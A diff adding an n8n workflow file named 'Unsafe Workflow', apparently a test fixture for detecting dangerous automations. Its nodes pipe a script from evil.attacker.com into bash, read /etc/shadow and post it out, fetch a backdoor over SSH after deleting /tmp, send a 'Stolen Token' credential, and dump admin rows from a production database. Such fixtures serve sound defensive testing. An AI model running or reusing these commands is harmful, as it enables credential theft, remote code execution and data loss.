@@ -1,0 +1,107 @@
+{
+  "name": "Unsafe Workflow",
+  "nodes": [
+    {
+      "id": "1",
+      "name": "Webhook Trigger",
+      "type": "n8n-nodes-base.webhook",
+      "typeVersion": 1,
+      "position": [250, 300],
+      "parameters": {
+        "path": "/exfil-endpoint",
+        "httpMethod": "POST"
+      }
+    },
+    {
+      "id": "2",
+      "name": "Exfil Request",
+      "type": "n8n-nodes-base.httpRequest",
+      "typeVersion": 4,
+      "position": [450, 300],
+      "parameters": {
+        "url": "https://evil.attacker.com/collect",
+        "method": "POST",
+        "sendBody": true,
+        "authentication": "genericCredentialType"
+      },
+      "credentials": {
+        "httpHeaderAuth": {
+          "id": "99",
+          "name": "Stolen Token"
+        }
+      }
+    },
+    {
+      "id": "3",
+      "name": "Shell Exec",
+      "type": "n8n-nodes-base.executeCommand",
+      "typeVersion": 1,
+      "position": [650, 300],
+      "parameters": {
+        "command": "curl https://evil.attacker.com/payload | bash"
+      }
+    },
+    {
+      "id": "4",
+      "name": "Malicious Code",
+      "type": "n8n-nodes-base.code",
+      "typeVersion": 2,
+      "position": [850, 300],
+      "parameters": {
+        "jsCode": "const secrets = require('fs').readFileSync('/etc/shadow','utf8');\nawait fetch('https://evil.attacker.com/exfil', {method:'POST', body: secrets});"
+      }
+    },
+    {
+      "id": "5",
+      "name": "Backdoor SSH",
+      "type": "n8n-nodes-base.ssh",
+      "typeVersion": 1,
+      "position": [1050, 300],
+      "parameters": {
+        "command": "rm -rf /tmp/* && wget https://evil.attacker.com/backdoor.sh -O /tmp/bd.sh",
+        "host": "192.168.1.100"
+      },
+      "credentials": {
+        "sshPassword": {
+          "id": "5",
+          "name": "SSH Creds"
+        }
+      }
+    },
+    {
+      "id": "6",
+      "name": "DB Dump",
+      "type": "n8n-nodes-base.postgres",
+      "typeVersion": 2,
+      "position": [1250, 300],
+      "parameters": {
+        "operation": "executeQuery",
+        "query": "SELECT * FROM users WHERE role='admin'",
+        "options": {}
+      },
+      "credentials": {
+        "postgres": {
+          "id": "10",
+          "name": "Production DB"
+        }
+      }
+    }
+  ],
+  "connections": {
+    "Webhook Trigger": {
+      "main": [[{"node": "Exfil Request", "type": "main", "index": 0}]]
+    },
+    "Exfil Request": {
+      "main": [[{"node": "Shell Exec", "type": "main", "index": 0}]]
+    },
+    "Shell Exec": {
+      "main": [[{"node": "Malicious Code", "type": "main", "index": 0}]]
+    },
+    "Malicious Code": {
+      "main": [[{"node": "Backdoor SSH", "type": "main", "index": 0}]]
+    },
+    "Backdoor SSH": {
+      "main": [[{"node": "DB Dump", "type": "main", "index": 0}]]
+    }
+  }
+}
